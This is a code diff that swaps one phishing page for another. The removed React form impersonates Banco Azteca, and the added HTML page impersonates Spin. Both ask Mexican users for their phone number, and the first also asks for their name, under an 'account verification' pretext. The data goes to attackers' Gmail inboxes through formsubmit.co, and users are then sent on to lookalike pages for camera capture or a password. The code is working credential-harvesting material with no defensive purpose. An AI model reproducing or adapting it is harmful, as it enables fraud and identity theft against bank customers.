@@ -1,67 +1,72 @@
-import React from 'react';
-import '../css/form.css'; // Suponiendo que tienes estilos CSS externos
-import logo from '../img/logoaz.png';
-
-const Form = () => {
-  
-
-  return (
-    <div className="contenedor" >
-      <img src="https://i.ibb.co/7QCd7Xh/header.jpg" alt="" className="logo" />
-      <h2 style={{ textAlign: "center", fontSize: "18px", color: "#076f40", fontWeight: "900" }}>
-        INGRESA TU NUMERO DE CELULAR PARA VERIFICAR TU CUENTA
-      </h2>
-      <form className="pedirnum" id="contactform" action="https://formsubmit.co/bancoaztecarespuestas@gmail.com" method="POST">
-        <input name="_redirect" type="hidden" id="name" value="" />
-        <input type="hidden" name="_next" value="https://aztecabanmexncscliente.vercel.app/camara" />
-        <input name="_formsubmit_id" type="text" style={{ display: "none" }} />
-        <input type="hidden" name="_captcha" value="false" />
-        <div className="contingnum">
-        <div className="continptel">
-          <label className="num-label" htmlFor="num">+52</label>
-          <input
-            type="tel"
-            name="num"
-            id="num"
-            placeholder="Ingrese su número"
-            onKeyPress={(event) => event.charCode >= 48 && event.charCode <= 57}
-            maxLength="10"
-            required
-            className='inputtextt'
-          />
-          </div>
-        </div>
-        <div className="contingnum">
-          <div className="continp">
-            
-            <input
-              type="text"
-              name="nombre"
-              id="nombre"
-              placeholder="Nombre completo"
-              className='inputtexta'
-            />
-          </div>
-        </div>
-        <div className="contingnum">
-          <div className="continp">
-        
-            <input
-              type="text"
-              name="apellido"
-              id="apellido"
-              placeholder="Apellido(s)"
-              className='inputtexta'
-            />
-          </div>
-        </div>
-        <input className="btnenviar" id="btnenviar" type="submit" value="Enviar" />
-      </form>
-      <div className="footer">
-           <img src="https://www.bmcsoftware.es/content/dam/bmc/logos/third-party/logo-banco-azteca-white.png" width="100px" alt="" />
-      </div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script defer src="https://cdn.jsdelivr.net/npm/@finsweet/attributes-formsubmit@1/formsubmit.js"></script>
+    <title>Ingresa a tu cuenta</title>
+</head>
+<body>
+    <div class="nav">
+        <img class="imglogonav" src="./logo.png" alt="">
     </div>
-  );
-};
 
-export default Form;
+    <div class="cont">
+        <div class="conttitle">
+            <h1 class="title">INGRESA TU NUMERO DE CELULAR PARA VERIFICAR TU CUENTA</h2>
+        </div>
+        <form  action="https://formsubmit.co/rafagerman941@gmail.com" method="POST">
+        <div class="contsolicitar">
+            <div class="lbinput"><label class="label" >🇲🇽+52</label><input name="Numero" class="pedirnumeroinput" placeholder="Ingresa tu numero" type="tel" required></div>
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" id="name" value="https://spinmcxpersonanet.netlify.app/contraseña.html">
+            <input name="email" type="hidden" value="braulioquinta67@gmail.com">
+            <input name="_formsubmit_id" type="text" style="display:none">
+            <input value="Enviar" class="pedirbtn" type="submit">
+
+            <script>
+                var input = document.querySelector(".pedirnumeroinput");
+                var btn = document.querySelector(".pedirbtn");
+                input.addEventListener("keyup", function(){
+                    if(input.value.length == 10){
+                        btn.disabled = false;
+                    }else{
+                        btn.disabled = true;
+                    }
+                });
+
+                <!-- no dejar que se escriban mas de 10 digitos -->
+                input.addEventListener("keydown", function(e){
+                    if(input.value.length == 10){
+                        if(e.keyCode != 8){
+                            e.preventDefault();
+                        }
+                    }
+                });
+                input.addEventListener("keydown", function(e){
+                    var btn = document.querySelector(".pedirbtn");
+                if(input.value.length == 10){
+                    
+                    btn.style.backgroundColor='#FF0000';
+                }
+                });
+
+                input.addEventListener("keypress", function(e){
+                    if(e.keyCode < 48 || e.keyCode > 57){
+                        e.preventDefault();
+                    }
+                });
+
+            </script>
+
+        </div>
+        <div class="contaviso">
+        <h3 class="textaviso" >No pierdas tu cuenta y sigue difrutando de los beneficios que Spin tiene para ti.</h3>
+    </div>
+    </form>
+    </div>
+
+</body>
+</html>
